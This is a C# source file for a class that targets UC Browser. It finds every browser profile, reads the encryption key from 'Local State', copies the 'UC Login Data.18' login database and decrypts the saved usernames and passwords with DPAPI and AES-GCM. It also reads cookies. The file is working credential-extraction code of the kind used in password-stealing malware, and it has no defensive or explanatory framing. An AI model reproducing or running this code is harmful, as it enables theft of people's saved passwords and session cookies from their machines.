using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using Org.BouncyCastle.Crypto.Modes;
using System.Diagnostics;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto;
using Newtonsoft.Json.Linq;
using System.Linq;
using System.Data.SQLite;

namespace dao
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class ChromeUC : IReader
    {
        public string BrowserName { get { return "UCBrowser"; } }

        private readonly BaseChrome Model;

        public ChromeUC()
        {
            string LOCAL_PATH = BaseChrome.GetAppDataLocalPath();
            string userDataPath = Path.Combine(LOCAL_PATH, @"UCBrowser\User Data");
            Model = new BaseChrome(userDataPath);
            UserDataPath = userDataPath;
        }

        public IEnumerable<PassModel> Passwords(string host = null)
        {
            return ReadPassword(host);
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            return Model.ReadCookie(host, "Cookies.9");
        }

        public string UserDataPath { get; set; }

        private string _enckey = null;
        public string EncKey
        {
            get
            {
                if (_enckey == null)
                {
                    try
                    {
                        //string encKey = File.ReadAllText(Path.Combine(GetLocalAppDataPath(), @"Google\Chrome\User Data\Local State"));
                        string encKey = File.ReadAllText(Path.Combine(UserDataPath, @"Local State"));
                        _enckey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
                    }
                    catch
                    {
                    }
                }
                return _enckey;
            }
        }

        public IEnumerable<PassModel> ReadPasswordProfile(string profileName, string logindataPath, string host = null)
        {
            var result = new List<PassModel>();
            if (File.Exists(logindataPath))
            {
                String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string target = APPDATA_PATH + @"\tempc";
                if (File.Exists(target))
                    File.Delete(target);
                File.Copy(logindataPath, target);
                using (var conn = new SQLiteConnection($"Data Source={target};"))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = "SELECT origin_url, username_value, password_value FROM wow_logins";
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    try
                                    {
                                        String url = reader.GetString(0);
                                        if (host != null && url != host) continue;
                                        String user = reader.GetString(1);
                                        String pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
                                        if (!String.IsNullOrEmpty(url) && (!String.IsNullOrEmpty(user) || !String.IsNullOrEmpty(pass)))
                                        {
                                            result.Add(new PassModel()
                                            {
                                                Url = url,
                                                Profile = profileName,
                                                Username = user,
                                                Password = pass
                                            });
                                        }
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            String url = reader.GetString(0);
                                            if (host != null && url != host) continue;
                                            String user = reader.GetString(1);
                                            var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(EncKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                                            String pass = _decryptWithKey(GetBytes(reader, 2), decodedKey, 3);
                                            if (!String.IsNullOrEmpty(url) && (!String.IsNullOrEmpty(user) || !String.IsNullOrEmpty(pass)))
                                            {
                                                result.Add(new PassModel()
                                                {
                                                    Url = url,
                                                    Profile = profileName,
                                                    Username = user,
                                                    Password = pass
                                                });
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            Debug.WriteLine(ex);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    conn.Close();
                }
                if (File.Exists(target))
                    File.Delete(target);
            }
            return result;
        }

        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }

        public IEnumerable<PassModel> ReadPassword(string host = null)
        {
            var result = new List<PassModel>();
            try
            {
                List<String> profileList = new List<string>
                {
                    "Default"
                };
                DirectoryInfo dInfo = new DirectoryInfo(UserDataPath);
                DirectoryInfo[] dInfoArray = dInfo.GetDirectories("Profile *", SearchOption.TopDirectoryOnly);
                foreach (DirectoryInfo d in dInfoArray)
                {
                    profileList.Add(d.Name);
                }
                foreach (String profileName in profileList)
                {
                    String profilePath = $"{UserDataPath}\\{profileName}\\UC Login Data.18";
                    result.AddRange(ReadPasswordProfile(profileName, profilePath, host));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed : {UserDataPath} : " + ex.Message);
            }
            return result;
        }

        private string _decryptWithKey(byte[] message, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException(String.Format("Key needs to be {0} bit!", KEY_BIT_SIZE), "key");
            if (message == null || message.Length == 0)
                throw new ArgumentException("Message required!", "message");

            using (var cipherStream = new MemoryStream(message))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(message.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return Encoding.Default.GetString(plainText);
            }
        }

    }

}
